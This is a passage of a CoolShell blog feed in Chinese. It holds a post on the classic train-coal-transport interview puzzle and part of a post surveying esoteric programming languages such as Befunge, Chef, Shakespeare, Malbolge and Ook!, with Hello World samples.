<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4334.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.36">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-4334-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-08T08:30:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/4334.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 面试题：火车运煤问题 ]]></title>
<link>https://coolshell.cn/articles/4429.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >这个可能是一个比较经典的智力题了，和以前的那个《<a title="面试题：赛马问题" href="https://coolshell.cn/articles/1202.html" target="_blank">赛马问题</a>》很相似，其题目如下：</p>
<p style="padding-left: 30px;"><strong><span style="color: #008000;">你是山西的一个煤老板，你在矿区开采了有3000吨煤需要运送到市场上去卖，从你的矿区到市场有1000公里，你手里有一列烧煤的火车，这个火车最多只能装1000吨煤，且其能耗比较大——每一公里需要耗一吨煤。请问，作为一个懂编程的煤老板的你，你会怎么运送才能运最多的煤到集市？</span></strong></p>
<p>这道题一开始看上去好像是无解的，因为你的火车每一公里就要消耗一吨煤，而到目的地有1000公里，而火车最多只能装1000吨媒。如果你的火车可以全部装下，到目的地也会被全部烧光，一丁点也不剩。所以，很多人的第一反应都是觉得这个不太可能。</p>
<p>如果你一开始就觉得不太可能的话，这是很正常的。不过我不知道你还会不会继续思考下去，如果你不想思考下去了，那么我很为你担忧，因为你可能并不是一个不善于思考的人，而是一个畏难的人，还有可能是一个容易放弃的人。这对于你做好 一个需要大量思考的工作的程序员来说可能并不适合。</p>
<p>我一开始也觉得不可能，后来想了一想，想到一个解法可以最多运送500吨煤到市场，方法如下：（<span style="color: #ff0000;">希望你先自己想一想再查看这个答案</span>）<br>
<span id="more-4429"></span><br>
<script>// <![CDATA[
function showAnswer(){
    document.getElementById('answer').style.display = '';
}
// ]]&gt;</script><br>
【<a href="javascript:showAnswer();"><strong>查看答案</strong></a>】</p>
<div id="answer" style="display: none; background-color: #eeeeee; padding: 10px 0px 5px 10px; border-style: dashed;">
<ol>
<li>装1000吨煤，走250公里，扔下500吨煤，回矿山。</li>
<li>装1000吨煤，走到250公里处，拿起250吨煤继续向前到500公里处，扔下500吨煤，回矿山。此时火车上还有250吨，再加上在250公里处还有250吨煤，所以，火车是可以回矿山的。</li>
<li>装上最后1000吨煤，走到500公里处，装上那里的500吨煤，然后一直走到目的。</li>
</ol>
<p>于是，你最多可以运送500吨煤到市场（当然，火车也回不去了，因为那矿山没有煤了）</p>
</div>
<p>好像这样很不错的了，不过还有更好的方法能运更多的媒过去。你知道这个方法吗？可以提示的是，就是以上述这个方法的思路。我先暂时不把答案放上来，你可以自己想想。过两天我把答案放上来。</p>
<p> </p>
<p><strong>更新（2011年4月17日）</strong>：大家都很聪明，533是应该是最优解，大家用了很多种方法阐述了这一过程，我最初的想法和朋友<a href="https://coolshell.cn/articles/4429.html#comment-44698" target="_blank">xPacificCoolShell</a>的一致！很高兴看到有更为科学的解法，受教了。另外，还有一些朋友提出火车不能随时随地调头的实际情况，非常不错，所以，以后这题不能用火车运煤了，可能是用马运草更好一点了。;)</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/7965.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7965.html" class="wp_rp_title">一个fork的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4162.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4162.html" class="wp_rp_title">又一个有趣的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3961.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3961.html" class="wp_rp_title">“火柴棍式”程序员面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3738.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3738.html" class="wp_rp_title">打印质数的各种算法</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3445.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3445.html" class="wp_rp_title">输出从1到1000的数</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3345.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3345.html" class="wp_rp_title">140个Google的面试题</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4429" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="88901ba2f9">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>49</strong> 人打了分，平均分： <strong>4.59</strong> )<br><span class="post-ratings-text" id="ratings_4429_text"></span><meta itemprop="name" content="面试题：火车运煤问题">
<meta itemprop="headline" content="面试题：火车运煤问题">
<meta itemprop="description" content="这个可能是一个比较经典的智力题了，和以前的那个《赛马问题》很相似，其题目如下：
你是山西的一个煤老板，你在矿区开采了有3000吨煤需要运送到市场上去卖，从你的矿区到市场有1000公里，你手里有一列烧煤的火车，这个火车最多只能装1000吨煤，且其能耗比较大——每一公里需要耗一吨煤。请问，作为一个懂编程的煤老板的你，你会怎么运送才能运最多的煤到集市？
这道题一开始看上去好像是无解的，因为你的火车每...">
<meta itemprop="datePublished" content="2011-04-11T09:01:31+08:00">
<meta itemprop="dateModified" content="2011-04-17T22:37:10+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4429.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4429.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.59">
<meta itemprop="ratingCount" content="49">
</div>
</div>
<div id="post-ratings-4429-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-11T09:01:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/4429.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ BT雷人的程序语言（大全） ]]></title>
<link>https://coolshell.cn/articles/4458.html</link>
<content><![CDATA[ 
<p>还记得以前本站的<a title="BT雷人的程序语言" href="https://coolshell.cn/articles/1142.html" target="_blank">BT雷人的程序语言</a>吗？除了那几个<a href="http://www.muppetlabs.com/~breadbox/bf/" target="_blank">Brainfuck</a>，<a href="http://lolcode.com/" target="_blank">LOLCODE</a>和<a href="http://compsoc.dur.ac.uk/whitespace/index.php" target="_blank">WhiteSpace</a>，我以为这些是比较BT的语言，但是自从这两天我在网上看到一些（见文章最后的参考一节），我发现我错了，这个世界上，只有更变态，没有最变态。不相，你看看下面这些，简直变态到了极致啊。（下面的语言变态不分排名）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Befunge" title="Befunge">Befunge</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Chef" title="Chef">Chef</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Shakespeare" title="Shakespeare">Shakespeare</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#BIT" title="BIT">BIT</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Haifu" title="Haifu">Haifu</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Piet" title="Piet">Piet</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Malbolge" title="Malbolge">Malbolge</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Unlambda" title="Unlambda">Unlambda</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#Ook" title="Ook!">Ook!</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#TMMLPTEALPAITAFNFAL" title="TMMLPTEALPAITAFNFAL">TMMLPTEALPAITAFNFAL</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#INTERCAL" title="INTERCAL">INTERCAL</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#HQ9" title="HQ9++">HQ9++</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#PerlYuYan" title="PerlYuYan">PerlYuYan</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#%E5%8F%82%E8%80%83%EF%BC%9A" title="参考：">参考：</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Befunge"></span>Befunge<span class="ez-toc-section-end"></span>
</h4>
<p>第一个变态语言<a href="http://quadium.net/funge/spec98.html" target="_blank">Befunge</a>。<a href="https://en.wikipedia.org/wiki/Befunge" target="_blank">维基</a>上面说——这门语言由Chris Pressey在1993年创造，本意为设计一种为难编译器的语言……结果马上出现了一批编译器。Befunge的代码是二维的。它用 &lt; &gt; v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下）走。&amp; 和 ~ 分别用于读入数字或字符并压入栈，句号和逗号分别表示将栈顶元素作为整数或字符输出。最后以一个@符号表示程序结束。Befunge代码的注释不需要任何符号标明，你可以把注释写在程序的任何地方，只要运行时指针不会经过它就行了。</p>
<p>下面这段Hello World代码：</p>
<pre style="padding-left: 30px;">&gt;              v
v  ,,,,,"Hello"&lt;
&gt;48*,          v
v,,,,,,"World!"&lt;
&gt;25*,@</pre>
<p>下面一个是算圆周率的代码，非常的壮观：</p>
<p><span id="more-4458"></span></p>
<pre style="padding-left: 30px;">aa*          v                  +------------------------+
vp*9920p*9930&lt;                  | Pi generator in Bef-97 |
&gt;:09a*pa*3/1+19a*p09a*g:09b*v   |                        |
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e294bda2">[email protected]</a># g*b90 p*b910        &lt; p&lt;   | 7/2/1997, Kevin Vigor  |
&gt;19a*g:+1-29b*p19a*g::09v       +------------------------+
v*a90g*b90*g*b91: _v#p*9&lt;
&gt;g-#v_ 2a*+\$  v  :$
&gt;\1-aa*ga*+v  p
v1:/g*b92p*991:&lt;  *
&gt;9b*p29b*g*199*g\v9
v*b92p*aa-1g*990-&lt;9
&gt;g2-29b*p099*g1-:0^
v -9p*b92:%ag*991  &lt;
&gt;#v_ 299*g1+299*p&gt;       ^
&gt;09b*g:#v_$v
v93p*b90-1&lt;
&gt;9*g199*ga/+.v
v:g*992 &lt;p*9 92-&lt;
v_29b*g399*p ^
&gt;09b*g:#v_v      1
vp*b90-1    &lt; $      g
&gt;199*g9`#v_'9,v      *
&gt;'0, &gt;' ,299^</pre>
<p>通常认为Befunge是第一个基于“二维控制流”的语言，后来衍生出的一大批类似的语言都是受的Befunge影响。例如PingPong语言就是把Befunge的四种箭头符号换成正反斜杠，控制指针移动方向90度旋转，起一个反弹的作用。</p>
<h4>
<span class="ez-toc-section" id="Chef"></span>Chef<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.dangermouse.net/esoteric/chef.html" target="_blank">Chef</a>如其名一样“主厨”(<a href="https://en.wikipedia.org/wiki/Chef_(programming_language)" target="_blank">Wiki link</a>)，这门语言主要是为了让程序代码看起来像菜谱。这可以使得我们的<a title="食客还是大厨" href="https://coolshell.cn/articles/3589.html" target="_blank">程序员更像是大厨</a>了，呵呵。该语言于2002年由David Morgan-Mar推出，核心是栈操作，特征就是——一套完整的Chef代码就是一个菜谱，程序名就是菜名，变量声明就是罗列原材料，后面一系列栈操作，就是菜肴的制作方法。把程序编写比作调和鼎鼐，有点意思，家庭主妇（或者“准家庭主妇”）试试看，权且当作人生预习。</p>
<p>用Chef编写Hello World代码如下：（在其网站上还有一个<a href="http://www.dangermouse.net/esoteric/chef_fib.html" target="_blank">斐波拉契数的例子</a>）</p>
<pre style="padding-left: 30px;">Hello World Souffle.

Ingredients.
72 g haricot beans
101 eggs
108 g lard
111 cups oil
32 zucchinis
119 ml water
114 g red salmon
100 g dijon mustard
33 potatoes

Method.
Put potatoes into the mixing bowl.
Put dijon mustard into the mixing bowl.
Put lard into the mixing bowl.
Put red salmon into the mixing bowl.
Put oil into the mixing bowl.
Put water into the mixing bowl.
Put zucchinis into the mixing bowl.
Put oil into the mixing bowl.
Put lard into the mixing bowl.
Put lard into the mixing bowl.
Put eggs into the mixing bowl.
Put haricot beans into the mixing bowl.
Liquefy contents of the mixing bowl.
Pour contents of the mixing bowl into the baking dish.

Serves 1.</pre>
<p>代码解读——原材料名显然可以随便改成别的原料，哪怕用单个字母也可以，不过少了点趣味性，但原料前面代表数量的数字不能改，那是ASCII代码。接下来菜肴制作方法就是把一个个字母和符号（都是ASCII）压入栈（就是代码中的“Put XXX into the mixing bowl”，从最后一个感叹号开始压），最后再把你做的菜托出上桌。</p>
<p>顺便说下，David Morgan-Mar已经设计出8种非主流编程语言了，还有一个变态的操作系统<a href="http://www.dangermouse.net/esoteric/petrovich.html" target="_blank">Petrovich</a>。  参看这位大哥的——<a href="http://www.dangermouse.net/esoteric/" target="_blank">DM’s Esoteric Programming Languages</a>（下面会介绍这位老大搞出来的语言）</p>
<h4>
<span class="ez-toc-section" id="Shakespeare"></span><strong>Shakespeare</strong><span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://shakespearelang.sourceforge.net/" target="_blank">Shakespeare</a>语言正如其名，其要让你的程序像“莎士比亚”的剧本一样充满艺术气息。</p>
<p>这个语言于2001年由Karl Hasselstrom和Jon Aslund联合推出，Shakespeare的代码完全模仿莎士比亚的戏剧。它也是一个基于栈的程序语言，程序中出场的每一个人物都代表一个栈。Shakespeare的代码自由度很高，因此同一个程序你可以写出完全不同的代码出来。</p>
<p>Shakespeare的Hello World代码如下（就是一部比较完整的“罗密欧与朱丽叶”的戏剧，作好心理准备）。“剧本”内容很无聊，就是一帮人在莫名其妙地称赞某些东西，里头还有古英语词汇，莎翁要是见了，可能会吐血。这里面Hello World或其ASCII码体现在全剧时不时出现的“The difference between……”句里面，根据各指代物品的好坏（比如鲜花算好的，牛粪算坏的）代表各数字，再进行各种运算最后相减（“The difference”暗指减法），得出一个字母或符号的ASCII码表。发明这个语言的人真是BT啊。</p>
<pre style="padding-left: 60px;">Romeo, a young man with a remarkable patience.
Juliet, a likewise young woman of remarkable grace.
Ophelia, a remarkable woman much in dispute with Hamlet.
Hamlet, the flatterer of Andersen Insulting A/S.</pre>
<pre style="padding-left: 30px;">Act I: Hamlet's insults and flattery.</pre>
<pre style="padding-left: 30px;">Scene I: The insulting of Romeo.</pre>
<pre style="padding-left: 30px;">[Enter Hamlet and Romeo]</pre>
<pre style="padding-left: 30px;">Hamlet:
You lying stupid fatherless big smelly half-witted coward!
You are as stupid as the difference between a handsome rich brave hero and thyself! Speak your mind!</pre>
<pre style="padding-left: 30px;">You are as brave as the sum of your fat little stuffed misused dusty old rotten codpiece and a beautiful fair warm peaceful sunny summer's day. You are as healthy as the difference between the sum of the sweetest reddest rose and my father and yourself! Speak your mind!</pre>
<pre style="padding-left: 30px;">You are as cowardly as the sum of yourself and the difference between a big mighty proud kingdom and a horse. Speak your mind.</pre>
<pre style="padding-left: 30px;">Speak your mind!</pre>
<pre style="padding-left: 30px;">[Exit Romeo]</pre>
<pre style="padding-left: 30px;">Scene II: The praising of Juliet.</pre>
<pre style="padding-left: 30px;">[Enter Juliet]</pre>
<pre style="padding-left: 30px;">Hamlet:
Thou art as sweet as the sum of the sum of Romeo and his horse and his black cat! Speak thy mind!</pre>
<pre style="padding-left: 30px;">[Exit Juliet]</pre>
<pre style="padding-left: 30px;">Scene III: The praising of Ophelia.</pre>
<pre style="padding-left: 30px;">[Enter Ophelia]</pre>
<pre style="padding-left: 30px;">Hamlet:
Thou art as lovely as the product of a large rural town and my amazing bottomless embroidered purse. Speak thy mind!</pre>
<pre style="padding-left: 30px;">Thou art as loving as the product of the bluest clearest sweetest sky and the sum of a squirrel and a white horse. Thou art as beautiful as the difference between Juliet and thyself. Speak thy mind!</pre>
<pre style="padding-left: 30px;">[Exeunt Ophelia and Hamlet]</pre>
<pre style="padding-left: 30px;">Act II: Behind Hamlet's back.</pre>
<pre style="padding-left: 30px;">Scene I: Romeo and Juliet's conversation.</pre>
<pre style="padding-left: 30px;">[Enter Romeo and Juliet]</pre>
<pre style="padding-left: 30px;">Romeo:
Speak your mind. You are as worried as the sum of yourself and the difference between my small smooth hamster and my nose. Speak your mind!</pre>
<pre style="padding-left: 30px;">Juliet:
Speak YOUR mind! You are as bad as Hamlet! You are as small as the difference between the square of the difference between my little pony and your big hairy hound and the cube of your sorry little codpiece. Speak your mind!</pre>
<pre style="padding-left: 30px;">[Exit Romeo]</pre>
<pre style="padding-left: 30px;">Scene II: Juliet and Ophelia's conversation.</pre>
<pre style="padding-left: 30px;">[Enter Ophelia]</pre>
<pre style="padding-left: 30px;">Juliet:
Thou art as good as the quotient between Romeo and the sum of a small furry animal and a leech. Speak your mind!</pre>
<pre style="padding-left: 30px;">Ophelia:
Thou art as disgusting as the quotient between Romeo and twice the difference between a mistletoe and an oozing infected blister! Speak your mind!</pre>
<pre style="padding-left: 30px;">[Exeunt]</pre>
<h4>
<span class="ez-toc-section" id="BIT"></span>BIT<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.dangermouse.net/esoteric/bit.html" target="_blank">BIT语言</a>也是 David Morgan-Mar 搞出来的。程序员在拥有访问所有数据的全部权限。这是一款强大的编程工具。在高级程序语言中，该工具可以操作这些令人费解的数据。</p>
<p>看看下面这段代码，其展示了BIT的强大之处——代码和注释的完美统一。（很像BASIC）</p>
<pre style="padding-left: 30px;">LINE NUMBER ONE CODE READ GOTO ONE ZERO
LINE NUMBER ONE ZERO CODE VARIABLE ZERO EQUALS THE JUMP REGISTER GOTO ONE ONE
LINE NUMBER ONE ONE CODE READ GOTO ONE ZERO ZERO
LINE NUMBER ONE ZERO ZERO CODE VARIABLE ONE EQUALS THE JUMP REGISTER GOTO ONE ZERO ONE
LINE NUMBER ONE ZERO ONE CODE THE JUMP REGISTER EQUALS OPEN PARENTHESIS VARIABLE ZERO NAND VARIABLE ONE CLOSE PARENTHESIS NAND OPEN PARENTHESIS VARIABLE ZERO NAND VARIABLE ONE CLOSE PARENTHESIS GOTO ONE ONE ZERO IF THE JUMP REGISTER IS EQUAL TO ONE GOTO ONE ZERO ZERO ZERO IF THE JUMP REGISTER IS EQUAL TO ZERO
LINE NUMBER ONE ONE ZERO CODE PRINT ONE GOTO ONE ONE ONE
LINE NUMBER ONE ONE ONE CODE PRINT ZERO
LINE NUMBER ONE ZERO ZERO ZERO CODE THE JUMP REGISTER EQUALS OPEN PARENTHESIS VARIABLE ZERO NAND VARIABLE ZERO CLOSE PARENTHESIS NAND OPEN PARENTHESIS VARIABLE ONE NAND VARIABLE ONE CLOSE PARENTHESIS GOTO ONE ZERO ZERO ONE IF THE JUMP REGISTER IS EQUAL TO ZERO GOTO ONE ZERO ONE ZERO IF THE JUMP REGISTER IS EQUAL TO ONE
LINE NUMBER ONE ZERO ZERO ONE CODE PRINT ZERO
LINE NUMBER ONE ZERO ONE ZERO CODE PRINT ONE</pre>
<p>当然，对于空格和换行符，显得太冗余了，去掉他们也没有问题。</p>
<pre style="padding-left: 30px;">LINENUMBERONECODEREADGOTOONEZEROLINENUMBERONEZEROCODEVARIABLEZEROEQUALSTHEJUMPR
EGISTERGOTOONEONELINENUMBERONEONECODEREADGOTOONEZEROZEROLINENUMBERONEZEROZEROCO
DEVARIABLEONEEQUALSTHEJUMPREGISTERGOTOONEZEROONELINENUMBERONEZEROONECODETHEJUMP
REGISTEREQUALSOPENPARENTHESISVARIABLEZERONANDVARIABLEONECLOSEPARENTHESISNANDOPE
NPARENTHESISVARIABLEZERONANDVARIABLEONECLOSEPARENTHESISGOTOONEONEZEROIFTHEJUMPR
EGISTERISEQUALTOONEGOTOONEZEROZEROZEROIFTHEJUMPREGISTERISEQUALTOZEROLINENUMBERO
NEONEZEROCODEPRINTONEGOTOONEONEONELINENUMBERONEONEONECODEPRINTZEROLINENUMBERONE
ZEROZEROZEROCODETHEJUMPREGISTEREQUALSOPENPARENTHESISVARIABLEZERONANDVARIABLEZER
OCLOSEPARENTHESISNANDOPENPARENTHESISVARIABLEONENANDVARIABLEONECLOSEPARENTHESISG
OTOONEZEROZEROONEIFTHEJUMPREGISTERISEQUALTOZEROGOTOONEZEROONEZEROIFTHEJUMPREGIS
TERISEQUALTOONELINENUMBERONEZEROZEROONECODEPRINTZEROLINENUMBERONEZEROONEZEROCOD
EPRINTONE</pre>
<h4>
<span class="ez-toc-section" id="Haifu"></span>Haifu<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.dangermouse.net/esoteric/haifu.html" target="_blank">Haifu</a>程序语言也是David Morgan-Mar 搞出来的。从命名上就可以看出来它是一个汉语拼音。正是如此，作者想使用东方的哲学来创造一种编程的语言。其中还有Yin（阴）和 Yang（阳）——相当于布尔变量中的True/False，当然，也有金（Metal）木（Wood）水（Water）火（Fire）土（Earth）。呵呵。</p>
<ul>
<li>Wood: tree, grass, cherry, oak.</li>
<li>Fire: flame, ash, smoke, embers.</li>
<li>Earth: soil, mountain, rock, plain.</li>
<li>Metal: sword, iron, plough, knife.</li>
<li>Water: rain, snow, river, ice.</li>
</ul>
<p>自然出现了一张关系表：</p>
<table border="1" cellspacing="0" cellpadding="3">
<tbody>
<tr>
<th>元素关系</th>
<th>操作</th>
</tr>
<tr>
<td>B 生A</td>
<td>A+B</td>
</tr>
<tr>
<td>B 克 A</td>
<td>A-B</td>
</tr>
<tr>
<td>B 怕 A</td>
<td>A/B</td>
</tr>
<tr>
<td>B 爱 A</td>
<td>A*B</td>
</tr>
<tr>
<td>B 就是 A</td>
<td>如果A和B都是阳，则是阳，否则是阴</td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="Piet"></span>Piet<span class="ez-toc-section-end"></span>
</h4>
<p>David Morgan-Mar 发明的用位图编程的<a href="http://www.dangermouse.net/esoteric/piet.html" target="_blank">Piet语言</a>也是BT到了极致，你还记得前两的那个“<a title="我有一个Hello World的C++程序编译不过" href="https://coolshell.cn/articles/4170.html" target="_blank">我的hello world编不过去</a>”文章中的那个强人用windows的画图程序编程的例子吗？呵呵Piet完全是用位图编程的语言。</p>
<p>下面这个图片就是其Hello World的示例：</p>
<p style="text-align: center;"><a href="http://www.topdesignmag.com/wp-content/uploads/2011/04/Piet_hello_big.png"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">再看看斐波拉契数列的程序示例:</p>
<p style="text-align: center;"><a href="http://www.dangermouse.net/esoteric/piet/fibbig.gif"><img alt="image placeholder" ></a></p>
<p>这里还有更多的示例：<a href="http://www.dangermouse.net/esoteric/piet/samples.html">http://www.dangermouse.net/esoteric/piet/samples.html</a></p>
<h4>
<span class="ez-toc-section" id="Malbolge"></span><strong>Malbolge</strong><span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.lscheffer.com/malbolge.shtml" target="_blank">Malbolge语言</a>，是最早的一个以代码丑陋为目标而设计出的程序语言，你几乎不可能读懂Malbolge的代码。它共有8条指令，所有运算都基于3进制，控制程序流的唯一指令是无条件跳转。其是BenOlmstead在1998年引进公共领域的深奥程序语言，名称来源于“the eighth circle of hell in Dante’s Inferno”，之后更名为Malbolge。</p>
<p>这被认为是地狱级的编程语言。</p>
<p>看看它的Hello World程序：</p>
<pre style="padding-left: 30px;"><code>('&amp;%:9]!~}|z2Vxwv-,POqponl$Hjig%<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4a2f080a">[email protected]</a>@&gt;}=&lt;M:9wv6WsU2T|nm-,jcL(I&amp;%$#"
 `CB]V?Tx&lt;uVtT`<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8bd9fbe4b8c5e7cda5c1e3a0a0cdefe9c8c9cacb">[email protected]</a>?]!~|4XzyTT43Qsqq(Lnmkj"Fhg${<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d7ad97">[email protected]</a>&gt;</code></pre>
<h4>
<span class="ez-toc-section" id="Unlambda"></span>Unlambda<span class="ez-toc-section-end"></span>
</h4>
<p>关于<a href="http://www.madore.org/~david/programs/unlambda/" target="_blank">Unlambda语言</a>，David Madore是这个语言的发明人，他于1976年8月3日生于法国，其是法国-加拿大籍数学家和计算机科学爱好者）。在unlambda里，所有东西都是函数。基本操作就是S， K， 和I三个组合子。当然，unlambda也加入一些扩展，让程序稍微好些一点。</p>
<pre style="padding-left: 30px;">```s``sii`ki
 ``s``s`ks
     ``s``s`ks``s`k`s`kr
               ``s`k`si``s`k`s`k
                               `d````````````.H.e.l.l.o.,. .w.o.r.l.d.!
                        k
      k
  `k``s``s`ksk`k.*</pre>
<h4>
<span class="ez-toc-section" id="Ook"></span>Ook!<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.dangermouse.net/esoteric/ook.html" target="_blank">Ook! 语言</a>也是David Morgan-Mar 发明的，与Brainfuck类似, 但用单词“<code>Ook！”</code>，“<code>Ook.</code>” 和“<code>Ook?</code>”代替。我们来看一个Hello World的一个示例：</p>
<pre style="padding-left: 30px;">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook. Ook. Ook? Ook. Ook? Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook.
Ook. Ook? Ook. Ook? Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.
Ook? Ook. Ook? Ook. Ook? Ook. Ook? Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
